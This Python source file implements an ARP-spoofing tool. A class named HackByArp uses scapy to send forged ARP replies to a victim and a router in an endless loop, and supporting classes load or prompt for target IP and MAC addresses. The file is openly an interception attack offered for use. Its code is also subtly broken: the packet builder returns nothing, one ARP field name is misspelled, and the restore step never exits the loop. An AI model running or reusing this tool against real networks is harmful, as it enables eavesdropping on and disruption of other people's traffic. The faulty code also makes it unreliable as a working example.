import os
from json import load, dump
from abc import ABC, abstractmethod
from scapy.all import ARP, send, get_if_addr, get_if_hwaddr, getmacbyip
import getmac
from time import sleep


class AbstractController(ABC):
    filename = 'objects_to_attack.json'
    output = []

    @abstractmethod
    def run(self):
        pass


class HackByArp():
    def __init__(self, parameters: dict = None) -> None:
        if parameters is not None:
            try:
                self.victim = parameters['victim']
                self.router = parameters['router']
                self.attacker = parameters['attacker']
            except KeyError as error:
                print(f'It isn\'t corect configuration - {error}')
        self._get_mac_addresses()

    def _get_mac_addresses(self):
        self.victim.append(getmac.get_mac_address(ip=self.victim[0]))
        self.router.append(getmac.get_mac_address(ip=self.router[0]))
        self.attacker.append(getmac.get_mac_address())

    @staticmethod
    def create_packet(victim_parameters: list, source_mac: str = None):
        try:
            arp_packet = ARP(
                pdst=victim_parameters[0],
                hwdst=victim_parameters[2],
                psrc=victim_parameters[1],
                op='is-at'
            )
            if source_mac is not None:
                arp_packet.hsrc = source_mac
        except:
            print('Packet is not created!')

    def attack(self):
        victim_arp = self.create_packet(self.victim)
        router_arp = self.create_packet(self.router)
        while True:
            try:
                send(victim_arp)
                send(router_arp)
                sleep(2)
            except KeyboardInterrupt:
                victim_arp = self.create_packet(self.victim, self.router[2])
                router_arp = self.create_packet(self.router, self.victim[2])
                send(victim_arp)
                send(router_arp)
                



class ConfigurationReader(AbstractController):
    def run(self):
        print('Start read config from "object_to_attack.json"...')
        with open(self.filename, mode='r') as input_file:
            self.output = load(input_file)

        return self.output


# TODO: To rebuild!!
class ConfigurationInput(AbstractController):
    def run(self):
        clear_console()
        while True:
            try:
                iterations = int(input('\n\nHow many objects do you want to add to list?\t'))
                break
            except ValueError:
                print('You must input integer number of iteration! Try again..')

        clear_console()
        print('\n\n\t\tInput parameters to attack.\nIn brackets, I write examples inputs, you must input your values in the same form\n\n')
        for i in range(iterations):
            print(f'Input parameters ({i+1} / {iterations})')
            parameters = {}
            parameters['attacked_ip'] = input('Attacked IP: (192.168.1.1)\t\t\t')
            parameters['attacked_mac'] = input('Attacked MAC address: (00:00:00:00:00:00)\t')
            parameters['swapped_ip'] = input('Swapped IP: (192.168.1.2)\t\t\t')
            print('-' * 50, '\n')
            self.output.append(parameters)

        clear_console()
        save_to_json = input('\n\nDo you want to save this config to json\'s file? [Y/n]\t')
        if save_to_json is '' or save_to_json.lower()[0] in ['y', 't']:
            choice = input(
                '\n\nDo you want to replace [R] the contents of file or append [A] to file? (press another key to cancel saving)\t')

            if choice.lower()[0] == 'a':
                try:
                    with open(self.filename, mode='r') as input_file:
                        exist_file = load(input_file)
                except FileNotFoundError:
                    exist_file = []

            else:
                exist_file = []

            if choice.lower()[0] in ['r', 'a']:
                with open(self.filename, mode='w') as output_file:
                    to_dump = self.output + exist_file
                    dump(to_dump, output_file)

                clear_console()
                print('\n\nFile saved!')

        return self.output


class QuitProgram(AbstractController):

    def run(self):
        clear_console()
        print('\n\n\nSee you later :)')
        return None


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
